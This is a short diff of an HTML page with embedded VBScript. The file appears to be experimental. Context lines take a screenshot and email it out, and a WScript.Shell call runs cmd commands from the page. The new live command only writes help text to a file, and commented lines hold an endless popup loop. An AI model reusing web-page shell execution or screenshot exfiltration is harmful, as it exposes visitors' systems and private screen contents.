@@ -27,11 +27,12 @@ oShell.Run "screenshot.exe"
 WScript.Sleep(8000)
 emailObj.AddAttachment scriptdir & "\screenshot.png"
 emailObj.Send
-</SCRIPT>-->
-<SCRIPT LANGUAGE="VBScript">
-Set oShell = WScript.CreateObject("WSCript.shell")
-oShell.run "cmd cd /d C:dir_test\file_test & sanity_check_env.bat arg1"
+
 rem do
 rem x=msgbox("This popup was created by a website" ,0, "Unautherized access, I guess")
 rem loop
+</SCRIPT>-->
+<SCRIPT LANGUAGE="VBScript">
+Set oShell = WScript.CreateObject("WSCript.shell")
+oShell.run "cmd /c 'help > dir'"
 </SCRIPT>
